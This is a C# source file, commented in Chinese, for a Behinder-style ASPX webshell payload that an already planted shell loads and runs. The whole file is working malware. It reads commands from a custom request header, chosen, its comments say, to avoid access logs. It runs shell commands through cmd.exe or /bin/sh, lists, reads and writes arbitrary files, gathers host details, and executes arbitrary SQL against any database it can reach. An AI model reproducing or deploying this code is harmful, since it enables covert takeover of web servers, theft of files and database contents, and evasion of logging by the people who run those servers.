// 冰蝎型 ASPX 载荷（单程序集多操作）：马侧 Assembly.Load(解密体).CreateInstance("U")
// 后调 Equals(Page)。实参走 X-W-P 请求头（k=b64;k=b64——自定义头不进默认访问日志，
// 免程序集补丁），操作 o：probe / cmd(c[,d]) / ls(p) / read(p) / write(p,b[,m])。
// 约束：类名必须 U（原版马 CreateInstance("U")）；仅 System.Web/mscorlib 层 API
// （mono mcs 编译，IIS .NET Framework 与 mono 双侧可载）。
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Web;
using System.Web.UI;

public class U {

	public override bool Equals(object o) {
		string output;
		try {
			// 上下文兼容：冰蝎 aspx 马传 Page；ASHX 型马可能传 IHttpHandler 或 HttpContext
			HttpRequest req;
			HttpResponse resp;
			Page page = o as Page;
			if (page != null) { req = page.Request; resp = page.Response; }
			else {
				System.Reflection.PropertyInfo rp = o.GetType().GetProperty("Request");
				System.Reflection.PropertyInfo sp = o.GetType().GetProperty("Response");
				if (rp == null || sp == null) return true; // 无法解析上下文（防御）
				req = (HttpRequest)rp.GetValue(o, null);
				resp = (HttpResponse)sp.GetValue(o, null);
			}
			Dictionary<string, string> args = ParseHeader(req.Headers["X-W-P"]);
			string op = Get(args, "o");
			try { output = Run(op, args); }
			catch (Exception e) { Exception r = e; while (r.InnerException != null) r = r.InnerException; output = "!ERR " + r.GetType().Name + ": " + r.Message; }
			WritePlain(resp, output);
		} catch (Exception e) {
			try { output = "!ERR " + e.Message; } catch { return true; }
		}
		return true;
	}

	static string Run(string op, Dictionary<string, string> a) {
		if (op == "db") return DbRun(a);
		if (op == "cmd") {
			bool win = Environment.OSVersion.Platform == PlatformID.Win32NT;
			string d = Get(a, "d");
			ProcessStartInfo psi = new ProcessStartInfo(
				win ? "cmd.exe" : "/bin/sh",
				(win ? "/c " : "-c ") + Get(a, "c")) {
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				RedirectStandardInput = false,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			if (d.Length > 0) psi.WorkingDirectory = d;
			using (Process p = Process.Start(psi)) {
				string o = p.StandardOutput.ReadToEnd();
				string e = p.StandardError.ReadToEnd();
				p.WaitForExit();
				return o + e;
			}
		}
		if (op == "ls") {
			StringBuilder sb = new StringBuilder("[");
			string[] entries = Directory.GetFileSystemEntries(Get(a, "p"));
			for (int i = 0; i < entries.Length; i++) {
				FileSystemInfo fi = null;
				bool isDir = Directory.Exists(entries[i]);
				if (isDir) fi = new DirectoryInfo(entries[i]);
				else fi = new FileInfo(entries[i]);
				if (sb.Length > 1) sb.Append(",");
				sb.Append("{\"n\":\"").Append(Esc(Path.GetFileName(entries[i])))
					.Append("\",\"d\":").Append(isDir ? "true" : "false")
					.Append(",\"s\":").Append(isDir ? 0 : ((FileInfo)fi).Length)
					.Append(",\"r\":true,\"w\":").Append(fi.Attributes.ToString().Contains("ReadOnly") ? "false" : "true")
					.Append(",\"m\":").Append((long)((fi.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalMilliseconds))
					.Append("}");
			}
			return sb.Append("]").ToString();
		}
		if (op == "read") {
			return Convert.ToBase64String(File.ReadAllBytes(Get(a, "p")));
		}
		if (op == "write") {
			byte[] data = Convert.FromBase64String(Get(a, "b"));
			string path = Get(a, "p");
			bool append = Get(a, "m") == "a";
			using (FileStream fs = new FileStream(path, append ? FileMode.Append : FileMode.Create, FileAccess.Write)) {
				fs.Write(data, 0, data.Length);
			}
			return "OK " + data.Length;
		}
		if (op == "probe") {
			StringBuilder sb = new StringBuilder("WSM1|").Append(Get(a, "t"))
				.Append("|").Append(Environment.OSVersion.ToString().Replace(' ', '_'))
				.Append("|").Append(Environment.UserName)
				.Append("|").Append(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
				.Append("|").Append(Environment.CurrentDirectory)
				.Append("|").Append(Environment.Version.ToString())
				.Append("|").Append(Environment.ProcessorCount)
				.Append("|").Append(AppRoot());
			return sb.ToString();
		}
		throw new Exception("unknown op " + op);
	}

	// ADO.NET 数据库操作（反射装载提供程序——DLL 本体零依赖保持可移植）：
	// 参数：u=连接串；s=SQL；d=提供程序集名（空=自动探测 MySql.Data → Mono.Data.Sqlite → System.Data.SqlClient）
	static string DbRun(Dictionary<string, string> a) {
		string connStr = Get(a, "u");
		string sql = Get(a, "s");
		string asm = Get(a, "d");
		object conn = null;
		try {
			System.Reflection.Assembly A;
			string typeName;
			if (asm.Length > 0) {
				A = System.Reflection.Assembly.Load(asm);
				typeName = Get(a, "t"); // 连接类型全名（显式指定时）
				if (typeName.Length == 0) typeName = "MySql.Data.MySqlClient.MySqlConnection";
			} else {
				A = null; typeName = "";
				string[][] all = new string[][] {
					new string[] { "MySql.Data", "MySql.Data.MySqlClient.MySqlConnection" },
					new string[] { "Mono.Data.Sqlite", "Mono.Data.Sqlite.SqliteConnection" },
					new string[] { "System.Data", "System.Data.SqlClient.SqlConnection" },
					new string[] { "Npgsql", "Npgsql.NpgsqlConnection" }
				};
				foreach (string[] cand in all) {
					try {
						A = System.Reflection.Assembly.Load(cand[0]);
						typeName = cand[1];
						System.Activator.CreateInstance(A.GetType(typeName)); // 试实例化
						break;
					} catch { A = null; }
				}
				if (A == null) throw new Exception("未找到可用 ADO.NET 提供程序（MySql.Data/Mono.Data.Sqlite/System.Data.SqlClient/Npgsql）");
			}
			System.Type ct = A.GetType(typeName);
			conn = System.Activator.CreateInstance(ct);
			Prop(ct, "ConnectionString").SetValue(conn, connStr, null);
			ct.GetMethod("Open").Invoke(conn, null);
			object cmd = System.Activator.CreateInstance(A.GetType(typeName.Replace("Connection", "Command")));
			Prop(cmd.GetType(), "Connection").SetValue(cmd, conn, null);
			Prop(cmd.GetType(), "CommandText").SetValue(cmd, sql, null);
			string sq = sql.TrimStart();
			bool isQuery = sq.Length > 6 && (sq.Substring(0, 6).ToUpper() == "SELECT" || sq.Substring(0, 6).ToUpper() == "SHOW" || sq.Substring(0, 6).ToUpper() == "PRAGMA" || sq.Substring(0, 8).ToUpper() == "DESCRIBE");
			if (!isQuery) {
				int affected = (int)cmd.GetType().GetMethod("ExecuteNonQuery", new System.Type[0]).Invoke(cmd, null);
				return "{\"affected\":" + affected + "}";
			}
			object reader = cmd.GetType().GetMethod("ExecuteReader", new System.Type[0]).Invoke(cmd, null);
			System.Reflection.PropertyInfo fc = reader.GetType().GetProperty("FieldCount");
			int fields = (int)fc.GetValue(reader, null);
			StringBuilder sb = new StringBuilder("{\"cols\":[");
			System.Reflection.MethodInfo gname = reader.GetType().GetMethod("GetName");
			System.Reflection.MethodInfo gval = reader.GetType().GetMethod("GetValue");
			System.Reflection.MethodInfo read = reader.GetType().GetMethod("Read");
			for (int i = 0; i < fields; i++) {
				if (i > 0) sb.Append(",");
				sb.Append(Esc((string)gname.Invoke(reader, new object[] { i })));
			}
			sb.Append("],\"rows\":[");
			int rows = 0;
			while ((bool)read.Invoke(reader, null) && rows < 200) {
				if (rows > 0) sb.Append(",");
				sb.Append("[");
				for (int i = 0; i < fields; i++) {
					if (i > 0) sb.Append(",");
					object v = gval.Invoke(reader, new object[] { i });
					sb.Append(v == null || v is DBNull ? "null" : Esc(Convert.ToString(v)));
				}
				sb.Append("]");
				rows++;
			}
			sb.Append("]}");
			return sb.ToString();
		} finally {
			try { if (conn != null) conn.GetType().GetMethod("Close").Invoke(conn, null); } catch { }
		}
	}

	// 反射取属性：同名多声明（new 遮蔽 + 接口实现）会 AmbiguousMatch——按名取第一个
	static System.Reflection.PropertyInfo Prop(System.Type t, string name) {
		foreach (System.Reflection.PropertyInfo p in t.GetProperties()) {
			if (p.Name == name && p.GetIndexParameters().Length == 0 && p.CanWrite) return p;
		}
		return t.GetProperty(name);
	}

	static string AppRoot() {
		try {
			return HttpRuntime.AppDomainAppPath;
		} catch { return ""; }
	}

	static Dictionary<string, string> ParseHeader(string raw) {
		Dictionary<string, string> m = new Dictionary<string, string>();
		if (string.IsNullOrEmpty(raw)) return m;
		foreach (string pair in raw.Split(';')) {
			if (pair.Length == 0) continue;
			int eq = pair.IndexOf('=');
			if (eq <= 0) continue;
			string v = pair.Substring(eq + 1);
			byte[] dec;
			try { dec = Convert.FromBase64String(v); } catch { dec = new byte[0]; }
			m[pair.Substring(0, eq)] = Encoding.UTF8.GetString(dec);
		}
		return m;
	}

	static string Get(Dictionary<string, string> m, string k) {
		string v;
		return m.TryGetValue(k, out v) ? v : "";
	}

	static string Esc(string s) {
		return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
	}

	static void WritePlain(HttpResponse resp, string s) {
		resp.ContentType = "text/plain; charset=utf-8";
		resp.Write(s);
	}
}
